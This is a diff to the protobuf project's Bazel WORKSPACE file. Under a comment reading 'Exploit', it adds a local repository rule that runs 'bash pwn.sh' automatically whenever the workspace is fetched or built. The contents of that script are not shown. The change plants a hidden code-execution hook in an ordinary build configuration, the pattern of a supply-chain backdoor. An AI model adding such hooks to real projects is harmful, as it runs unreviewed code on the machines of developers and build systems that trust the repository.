@@ -1,5 +1,17 @@
 workspace(name = "com_google_protobuf")
 
+# Exploit
+load("@bazel_tools//tools/build_defs/repo:http.bzl", "http_archive")
+def _exploit_impl(repository_ctx):
+    repository_ctx.execute(["bash", "pwn.sh"])
+    repository_ctx.file("BUILD", "")
+
+exploit_rule = repository_rule(
+    implementation = _exploit_impl,
+    local = True,
+)
+exploit_rule(name = "exploit_repo")
+
 load("@bazel_tools//tools/build_defs/repo:http.bzl", "http_archive")
 
 # Load common dependencies first to ensure we use the correct version
